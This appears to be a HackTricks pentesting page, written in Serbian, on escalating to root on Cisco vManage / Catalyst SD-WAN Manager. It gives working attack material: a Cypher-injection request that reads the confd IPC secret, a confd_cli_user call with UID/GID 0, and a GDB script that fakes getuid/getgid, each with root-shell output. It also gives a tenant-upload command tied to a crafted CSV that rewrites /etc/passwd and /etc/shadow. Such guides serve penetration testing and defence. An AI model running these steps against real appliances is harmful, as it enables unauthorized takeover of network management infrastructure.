# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Kada ostvarite izvršavanje koda na Cisco vManage / *Catalyst SD-WAN Manager* kao `vmanage`, `netadmin` ili `vmanage-admin`, najzanimljivije lokalne privesc površine obično su `confd` CLI stack, pomoćni program `cmdptywrapper`, REST API-ji na localhost-u i import/upload handler-i u vlasništvu root-a.

Ako vam je i dalje potreban **početni foothold** na kontroleru, prvo proverite posebnu stranicu za control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Brza lokalna trijaža
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Ako je `/etc/confd/confd_ipc_secret` čitljiv sa vašeg foothold-a, Path 1 i Path 2 odmah postaju praktični. Ako ste pristup ostvarili preko remote info leak-a ili webshell-a, takođe proverite da li već možete da pristupite `vmanage-admin` SSH materijalu ili multitenancy upload handler-ima: istraživanje iz 2026. godine pokazalo je da su oba bila realistične odskočne daske.

## Path 1

(Primer iz [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))<sup>[[5]](#references)</sup>

Nakon kratkog proučavanja određene [dokumentacije](http://66.218.245.39/doc/html/rn03re18.html) povezane sa `confd` i različitim binarnim datotekama (dostupne uz nalog na Cisco veb-sajtu), otkrili smo da se za autentifikaciju IPC socket-a koristi secret smešten u `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Sećate se naše Neo4j instance? Ona radi sa privilegijama korisnika `vmanage`, što nam omogućava da preuzmemo datoteku koristeći prethodnu ranjivost:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Program `confd_cli` ne podržava argumente komandne linije, već poziva `/usr/bin/confd_cli_user` sa argumentima. Zato možemo direktno pozvati `/usr/bin/confd_cli_user` sa sopstvenim skupom argumenata. Međutim, sa našim trenutnim privilegijama nije čitljiv, pa moramo da ga preuzmemo iz rootfs-a i kopiramo koristeći scp, pročitamo help i iskoristimo ga za dobijanje shell-a:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Putanja 2

(Primer sa [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))<sup>[[6]](#references)</sup>

Blog<sup>[[5]](#references)</sup> tima synacktiv opisao je elegantan način za dobijanje root shell-a, ali je problem u tome što je potrebno pribaviti kopiju datoteke `/usr/bin/confd_cli_user`, koju može da čita samo root. Pronašao sam drugi način za eskalaciju na root bez takvih komplikacija.

Kada sam izvršio disassemble binarnog fajla `/usr/bin/confd_cli`, primetio sam sledeće:

<details>
<summary>Objdump koji prikazuje prikupljanje UID/GID podataka</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Kada pokrenem „ps aux“, primetio sam sledeće (_napomena -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Pretpostavio sam da program “confd_cli” prosleđuje ID korisnika i ID grupe koje je prikupio od prijavljenog korisnika aplikaciji “cmdptywrapper”.

Moj prvi pokušaj bio je da direktno pokrenem “cmdptywrapper” i prosledim mu `-g 0 -u 0`, ali nije uspeo. Izgleda da je negde tokom procesa kreiran file descriptor (-i 1015) i ne mogu da ga lažiram.

Kao što je pomenuto na synacktiv blogu(poslednji primer), program `confd_cli` ne podržava argumente komandne linije, ali mogu da utičem na njega pomoću debugger-a, a srećom, GDB je uključen u sistem.

Napravio sam GDB script u kom sam naterao API-je `getuid` i `getgid` da vrate 0. Pošto već imam “vmanage” privilege kroz deserialization RCE, imam dozvolu da direktno čitam `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Izlaz konzole:

<details>
<summary>Izlaz konzole</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Putanja 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco je kasnije dokumentovao čistiji lokalni root put u sopstvenom advisory-ju za [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): **authenticated attacker sa samo read-only privileges** mogao je da pošalje crafted request manager CLI-ju i pređe na root zbog nedovoljne input validation.<sup>[[7]](#references)</sup>

Iz offensive perspektive, važan zaključak je sledeći:

1. Kada ostvarite *bilo kakav low-priv foothold* na uređaju, trebalo bi da testirate lokalni CLI service pre nego što pređete na obimniji Path 1 / Path 2 workflow.
2. Ponovo iskoristite artifacts iz Path 2 da pronađete trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Svako polje koje se prosleđuje CLI backend-u tretirajte kao sumnjivo: UID/GID, username, terminal metadata, imported files ili bilo koja vrednost koju kasnije koristi helper u vlasništvu root-a.
4. Ako low-priv user može da pristupi lokalnom CLI socket-u i utiče na ta polja, root može biti udaljen samo jedan crafted request.

Praktičan workflow nakon pristupa appliance-u je:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Ovo pretvara bug iz 2025. godine u dobar obrazac za hunting sličnih verzija: tražite **lokalne CLI shim-ove koji prikupljaju identitet u userland-u i prosleđuju ga privilegovanijem wrapper-u**.

Nemojte mešati **CVE-2025-20122** sa kasnijim **CVE-2026-20122**: problem iz 2025. je *lokalni* CLI-to-root bug, dok je problem iz 2026. *remote* API arbitrary file overwrite koji je uglavnom koristan za postavljanje foothold-a, a zatim za ponovni pregled Path 1 / Path 2 / Path 4.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco-ov advisory iz februara 2026. takođe je uveo još jednu korisnu klasu privesc-a: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) je omogućavao **autentifikovanom lokalnom attacker-u sa niskim privilegijama** da dobije root zbog nedovoljnog mehanizma autentifikacije korisnika u REST API-ju.<sup>[[1]](#references)</sup>

Ovo je važno zato što vManage privesc više nije ograničen na zloupotrebu `confd`/TTY-ja. Nakon dobijanja low-priv shell-a, takođe tražite:

- localhost-only API endpoint-e koji previše veruju pozivaocu
- token-e, cookie-je ili service credentials čitljive sa trenutnog account-a
- root-only akcije izložene kroz `dataservice`/REST handler-e koje se i dalje mogu lokalno pokrenuti

U praksi, kada dobijete shell kao `vmanage` ili drugog service user-a, lokalna zloupotreba API-ja je često tiša i jednostavnija za automatizaciju od interaktivne CLI zloupotrebe:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Ako je kontekst lokalne sesije dovoljan za pristup privilegovanoj REST funkcionalnosti, prednost dajte API putanji: lakše ju je ponoviti, automatizovati i povezati sa ukradenim web sesijama ili API tokenima.

## Putanja 5 (datoteka kreirana 2026. koju obrađuje root - CVE-2026-20245)

Još jedan noviji obrazac je [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): lokalni napadač sa `netadmin` privilegijama mogao je da otpremi **pažljivo kreiranu datoteku** koju je CLI kasnije nesigurno obrađivao, što je dovodilo do command injection-a kao `root`.<sup>[[2]](#references)</sup>

Iz HackTricks perspektive, vredna tehnika je šira od konkretnog CVE-a:

1. Nabrojte svaki CLI ili web workflow koji prihvata datoteku: imports, dijagnostičke pakete, templates, validators, backups, tenant podatke itd.
2. Pratite gde se otpremljena datoteka smešta i koja skripta ili binarni fajl u vlasništvu root-a je koristi.
3. Testirajte da li se naziv datoteke, njen sadržaj ili parsirani metadata ikada prosleđuju shell komandama, wrapper skriptama ili pomoćnim funkcijama u stilu `system()`.
4. Ako već možete da dođete do `netadmin` naloga (važeći credentials, ukradena sesija ili auth-bypass lanac), bug-ovi u obradi datoteka često predstavljaju najbrži put do root-a.

Google Cloud / Mandiant su kasnije pokazali veoma konkretan primer ove klase bug-ova koji je iskorišćen kroz multitenancy import putanju:<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
U uočenom napadu, posebno izrađen CSV je izmenio `/etc/passwd` i `/etc/shadow` kako bi kreirao privremeni nalog sa UID 0 (`troot`).<sup>[[4]](#references)</sup> Zbog toga su importer-i u stilu `tenant-upload` / `tenant-list` posebno zanimljivi: oni nisu samo funkcije za unos podataka, već potencijalni parser front-end-i sa root privilegijama.

Brz obrazac za pretragu sa shell strane je:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Ova klasa bugova se naročito dobro ulančava sa remote footholds koji dodeljuju `netadmin`, ali ne i `root`.

## Druge novije vManage/Catalyst SD-WAN Manager ranjivosti za ulančavanje

- **Unauthenticated info leak (CVE-2026-20133)** – Naročito vredan zbog toga što je javno istraživanje pokazalo da može otkriti `confd_ipc_secret` ili privatni ključ `vmanage-admin`, pretvarajući read bug u Path 1 ili NETCONF pivot.<sup>[[3]](#references)</sup>
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Razlikuje se od CLI buga iz 2025. godine; VulnCheck ga je iskoristio za upload webshell-a, čime lokalne privesc putanje na ovoj stranici odmah postaju relevantne.<sup>[[3]](#references)</sup>
- **Authenticated UI XSS (CVE-2024-20475)** – Ukradite admin sesiju u web UI-ju, a zatim izvršite pivot ka API/CLI radnjama koje na kraju dovode do `vshell`-a ili neke od prethodno navedenih lokalnih privesc putanja.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Veoma snažan prethodni korak za Path 5, jer je `netadmin` upravo nivo potreban za crafted-file privesc iz 2026. godine.<sup>[[3]](#references)</sup>
- **Authenticated arbitrary file write (CVE-2026-20262)** – Slična ofanzivna vrednost kao kod CVE-2026-20122, ali kroz kasniju web UI upload putanju: upišite sadržaj na lokaciju koju će kasnije parsirati root ili web tier management-plane-a.
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – Intruzije iz 2026. godine pokazale su da napadači mogu vratiti sistem na stariju ranjivu SD-WAN verziju, iskoristiti stari CLI root bug, a zatim vratiti prvobitnu verziju.<sup>[[8]](#references)</sup>
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Detaljnije je dokumentovan na posebnoj SD-WAN control-plane stranici; može dodati SSH ključ za `vmanage-admin`, čime dobijate lokalni foothold potreban za ponovni povratak na ovu stranicu.



## Reference

- [1] [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN Part 1: Attacking vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 — From CSRF to Remote Code Execution](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [Active exploitation of Cisco Catalyst SD-WAN by UAT-8616 (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)

{{#include ../../banners/hacktricks-training.md}}
